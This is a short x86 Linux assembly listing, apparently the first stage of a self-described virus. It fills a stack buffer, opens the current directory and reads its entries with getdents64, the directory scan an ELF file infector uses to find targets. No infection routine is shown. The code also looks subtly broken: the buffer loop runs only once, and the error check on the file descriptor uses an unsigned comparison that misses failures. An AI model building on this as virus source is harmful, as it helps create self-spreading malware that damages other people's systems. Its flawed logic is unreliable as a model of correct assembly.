section .text

	global v_start

v_start:
	mov ecx, 2328
loop_bss:
	push 0x00
	sub ecx, 1
	cmp ecx, 0
	jbe loop_bss
	mov edi, esp

	call folder
	db ".", 0
folder:
	pop ebx
	mov esi, 0
	mov eax, 5
	mov ecx, 0
	mov edx, 0
	int 0x80
	cmp eax, 0      ; check if fd in eax > 0 (ok)
	jbe v_stop        ; cannot open file.  Exit virus

	mov ebx, eax
	mov eax, 0xdc   ; sys_getdents64
	mov ecx, edi    ; fake .bss section
	add ecx, 32     ; offset for buffer
	mov edx, 1024
	int 80h

	mov eax, 6  ; close
	int 80h
	xor ebx, ebx    ; zero out ebx as we will use it as the buffer offset
v_stop:
	mov eax, 1
	mov ebx, 0
	int 0x80
